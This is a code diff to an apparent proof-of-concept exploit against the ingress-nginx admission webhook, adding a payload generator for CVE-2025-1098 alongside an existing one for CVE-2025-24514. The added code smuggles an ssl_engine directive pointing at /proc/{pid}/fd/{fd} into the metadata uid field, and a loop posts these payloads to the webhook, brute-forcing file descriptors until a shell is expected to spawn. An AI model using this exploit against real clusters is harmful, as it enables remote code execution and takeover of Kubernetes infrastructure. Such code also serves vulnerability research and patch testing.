@@ -82,12 +82,17 @@ def CVE_2025_24514_gen_template(pid: int, fd: int) -> str:
         "http://example.com/#;\n}\n}\n}\n" + f"ssl_engine ../../../proc/{pid}/fd/{fd}"
     return json.dumps(data)
 
+def CVE_2025_1098_gen_template(pid: int, fd: int) -> str:
+    data = TEMPLATE.copy()
+    data["request"]["object"]["metadata"]["uid"] = "abcdef12-3456-7890-abcd-ef1234567890LITIOS{}\n}\n}\n"+f"ssl_engine ../../../proc/{pid}/fd/{fd};\n"
+    return json.dumps(data)
+
 def attempt_exec(pid: int, botom_fd: int = 20, top_fd: int = 40):
     headers = {"Content-Type": "application/json"}
     for fd in range(botom_fd, top_fd):
         if SHELL_SPAWNED.is_set():
             return
-        data = CVE_2025_24514_gen_template(pid, fd)
+        data = TARGET_CVE(pid, fd)
         try:
             response = requests.post("https://localhost:8444/validate", data=data, headers=headers, verify=False, timeout=5)
             print(f'Trying /proc/{pid}/fd/{fd} -> rc {response.status_code}')
@@ -95,6 +100,8 @@ def attempt_exec(pid: int, botom_fd: int = 20, top_fd: int = 40):
             print('Shell should be ready -- closing threads')
             SHELL_SPAWNED.set()
             
+
+TARGET_CVE = CVE_2025_1098_gen_template
 
 if __name__ == "__main__":
     compile()
